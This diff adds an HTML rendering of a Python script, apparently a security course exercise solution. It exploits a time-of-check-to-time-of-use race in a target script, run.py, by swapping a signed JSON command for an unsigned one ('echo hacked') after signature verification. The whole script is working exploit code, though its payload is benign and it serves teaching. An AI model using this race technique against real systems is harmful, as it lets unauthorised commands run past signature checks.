@@ -1,0 +1,92 @@
+<html>
+<head>
+<title>q5.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(204,120,50); font-weight: bold; }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(98,151,85); font-style: italic; }
+.s3 { color: rgb(128,128,128); }
+.s4 { color: rgb(165,194,97); }
+.s5 { color: rgb(204,120,50); }
+.s6 { color: rgb(104,151,187); }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q5.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">import </span><span class="s1">json 
+<a name="l2"><span class="ln">2    </span></a></span><span class="s0">import </span><span class="s1">subprocess 
+<a name="l3"><span class="ln">3    </span></a></span><span class="s0">import </span><span class="s1">time 
+<a name="l4"><span class="ln">4    </span></a> 
+<a name="l5"><span class="ln">5    </span></a></span><span class="s0">def </span><span class="s1">change_json_file(path): 
+<a name="l6"><span class="ln">6    </span></a>    </span><span class="s2">&quot;&quot;&quot; 
+<a name="l7"><span class="ln">7    </span></a>    Method to change json file object to our desired command 
+<a name="l8"><span class="ln">8    </span></a>    &quot;&quot;&quot;</span><span class="s1"> 
+<a name="l9"><span class="ln">9    </span></a>    </span><span class="s3"># read original file content</span><span class="s1"> 
+<a name="l10"><span class="ln">10   </span></a>    </span><span class="s0">with </span><span class="s1">open(path) </span><span class="s0">as </span><span class="s1">reader: 
+<a name="l11"><span class="ln">11   </span></a>        data = json.load(reader) 
+<a name="l12"><span class="ln">12   </span></a> 
+<a name="l13"><span class="ln">13   </span></a>    </span><span class="s3"># change to whatever command we want - in our case just echo hacked</span><span class="s1"> 
+<a name="l14"><span class="ln">14   </span></a>    data[</span><span class="s4">&quot;command&quot;</span><span class="s1">] = </span><span class="s4">'echo hacked'</span><span class="s1"> 
+<a name="l15"><span class="ln">15   </span></a> 
+<a name="l16"><span class="ln">16   </span></a>    </span><span class="s3"># save the new json object to the same file overriding the original content</span><span class="s1"> 
+<a name="l17"><span class="ln">17   </span></a>    json_data = json.dumps(data) 
+<a name="l18"><span class="ln">18   </span></a>    </span><span class="s0">with </span><span class="s1">open(path</span><span class="s5">, </span><span class="s4">'w'</span><span class="s1">) </span><span class="s0">as </span><span class="s1">writer: 
+<a name="l19"><span class="ln">19   </span></a>        writer.write(json_data) 
+<a name="l20"><span class="ln">20   </span></a> 
+<a name="l21"><span class="ln">21   </span></a></span><span class="s0">def </span><span class="s1">write_example_json_file(path): 
+<a name="l22"><span class="ln">22   </span></a>    </span><span class="s2">&quot;&quot;&quot; 
+<a name="l23"><span class="ln">23   </span></a>    Method to write a working command. combination of command and mathing signature 
+<a name="l24"><span class="ln">24   </span></a>    &quot;&quot;&quot;</span><span class="s1"> 
+<a name="l25"><span class="ln">25   </span></a>    data = {</span><span class="s4">&quot;command&quot;</span><span class="s1">: </span><span class="s4">&quot;echo cool&quot;</span><span class="s5">, </span><span class="s4">&quot;signature&quot;</span><span class="s1">: </span><span class="s4">&quot;6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9&quot;</span><span class="s1">} 
+<a name="l26"><span class="ln">26   </span></a>    json_data = json.dumps(data) 
+<a name="l27"><span class="ln">27   </span></a>    </span><span class="s0">with </span><span class="s1">open(path</span><span class="s5">, </span><span class="s4">'w'</span><span class="s1">) </span><span class="s0">as </span><span class="s1">writer: 
+<a name="l28"><span class="ln">28   </span></a>        writer.write(json_data) 
+<a name="l29"><span class="ln">29   </span></a> 
+<a name="l30"><span class="ln">30   </span></a> 
+<a name="l31"><span class="ln">31   </span></a></span><span class="s0">def </span><span class="s1">main(argv): 
+<a name="l32"><span class="ln">32   </span></a>    </span><span class="s0">if not </span><span class="s6">1 </span><span class="s1">&lt;= len(argv) &lt;= </span><span class="s6">2</span><span class="s1">: 
+<a name="l33"><span class="ln">33   </span></a>        </span><span class="s0">print</span><span class="s1">(</span><span class="s4">'USAGE: %s &lt;script-path&gt;' </span><span class="s1">% argv[</span><span class="s6">0</span><span class="s1">]) 
+<a name="l34"><span class="ln">34   </span></a>        </span><span class="s0">return </span><span class="s6">1</span><span class="s1"> 
+<a name="l35"><span class="ln">35   </span></a> 
+<a name="l36"><span class="ln">36   </span></a>    </span><span class="s0">if </span><span class="s1">len(argv) == </span><span class="s6">2</span><span class="s1">: 
+<a name="l37"><span class="ln">37   </span></a>        path = argv[</span><span class="s6">1</span><span class="s1">] 
+<a name="l38"><span class="ln">38   </span></a>    </span><span class="s0">else</span><span class="s1">: 
+<a name="l39"><span class="ln">39   </span></a>        path = </span><span class="s4">&quot;hack&quot;</span><span class="s1"> 
+<a name="l40"><span class="ln">40   </span></a> 
+<a name="l41"><span class="ln">41   </span></a>    </span><span class="s0">try</span><span class="s1">: 
+<a name="l42"><span class="ln">42   </span></a> 
+<a name="l43"><span class="ln">43   </span></a>        </span><span class="s3"># First we must have a valid payload for the authentication part</span><span class="s1"> 
+<a name="l44"><span class="ln">44   </span></a>        write_example_json_file(path) 
+<a name="l45"><span class="ln">45   </span></a> 
+<a name="l46"><span class="ln">46   </span></a>        </span><span class="s3"># Executre the run.py script in a child process</span><span class="s1"> 
+<a name="l47"><span class="ln">47   </span></a>        p = subprocess.Popen([</span><span class="s4">&quot;python&quot;</span><span class="s5">, </span><span class="s4">&quot;run.py&quot;</span><span class="s5">, </span><span class="s1">path]</span><span class="s5">,</span><span class="s1"> 
+<a name="l48"><span class="ln">48   </span></a>                 stdin=None</span><span class="s5">, </span><span class="s1">stdout=None</span><span class="s5">, </span><span class="s1">stderr=None</span><span class="s5">, </span><span class="s1">close_fds=True) 
+<a name="l49"><span class="ln">49   </span></a> 
+<a name="l50"><span class="ln">50   </span></a>        </span><span class="s3"># Sleep for a while before changing the file's content.</span><span class="s1"> 
+<a name="l51"><span class="ln">51   </span></a>        </span><span class="s3"># Most likely it will initiate a context switch to the child process running run.py</span><span class="s1"> 
+<a name="l52"><span class="ln">52   </span></a>        time.sleep(</span><span class="s6">1</span><span class="s1">) 
+<a name="l53"><span class="ln">53   </span></a> 
+<a name="l54"><span class="ln">54   </span></a>        </span><span class="s3"># Most likely that this current (father) process will continue after the authentication part in run.py had occurred</span><span class="s1"> 
+<a name="l55"><span class="ln">55   </span></a>        </span><span class="s3"># All we need to do now is to change the content before the execution phase - result in a TOCTTOU vulnerabilty</span><span class="s1"> 
+<a name="l56"><span class="ln">56   </span></a>        change_json_file(path) 
+<a name="l57"><span class="ln">57   </span></a> 
+<a name="l58"><span class="ln">58   </span></a>        </span><span class="s3"># Wait for the child process to finish, not mandatory but prefered.</span><span class="s1"> 
+<a name="l59"><span class="ln">59   </span></a>        p.wait() 
+<a name="l60"><span class="ln">60   </span></a> 
+<a name="l61"><span class="ln">61   </span></a>    </span><span class="s0">except </span><span class="s1">Exception </span><span class="s0">as </span><span class="s1">error: 
+<a name="l62"><span class="ln">62   </span></a>        </span><span class="s0">print</span><span class="s1">(</span><span class="s4">'ERROR: %s' </span><span class="s1">% error) 
+<a name="l63"><span class="ln">63   </span></a>        </span><span class="s0">return </span><span class="s1">-</span><span class="s6">1</span><span class="s1"> 
+<a name="l64"><span class="ln">64   </span></a> 
+<a name="l65"><span class="ln">65   </span></a></span><span class="s0">if </span><span class="s1">__name__ == </span><span class="s4">'__main__'</span><span class="s1">: 
+<a name="l66"><span class="ln">66   </span></a>    </span><span class="s0">import </span><span class="s1">sys 
+<a name="l67"><span class="ln">67   </span></a>    sys.exit(main(sys.argv)) 
+<a name="l68"><span class="ln">68   </span></a></span></pre>
+</body>
+</html>
